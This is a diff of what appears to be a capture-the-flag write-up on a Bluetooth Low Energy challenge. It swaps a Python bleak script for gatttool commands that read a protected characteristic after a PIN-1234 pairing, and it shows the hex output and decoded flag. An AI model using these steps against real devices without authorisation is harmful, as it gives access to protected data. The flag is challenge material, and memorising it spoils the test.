@@ -82,23 +82,18 @@ chmod +x brute_force.expect
 
 Once paired with PIN `1234`:
 
-```python
-import asyncio
-from bleak import BleakClient
-
-MAC = "AA:BB:CC:DD:EE:FF"
-FLAG_UUID = "b1eb1eb1-0001-1000-8000-00805f9b34fb"
-
-async def main():
-    async with BleakClient(MAC) as client:
-        # The device should be paired — read the protected characteristic
-        value = await client.read_gatt_char(FLAG_UUID)
-        print(value.decode())
-
-asyncio.run(main())
+```bash
+gatttool -b AA:BB:CC:DD:EE:FF -I
+[AA:BB:CC:DD:EE:FF][LE]> connect
+[AA:BB:CC:DD:EE:FF][LE]> char-read-uuid b1eb1eb1-0001-1000-8000-00805f9b34fb
 ```
 
-Output:
+Expected output:
+```
+handle: 0x0003   value: 57 4f 43 53 41 7b 70 69 6e 5f 31 32 33 34 5f 69 73 5f 6e 6f 74 5f 61 5f 70 61 73 73 77 6f 72 64 7d
+```
+
+Decode:
 ```
 WOCSA{pin_1234_is_not_a_password}
 ```
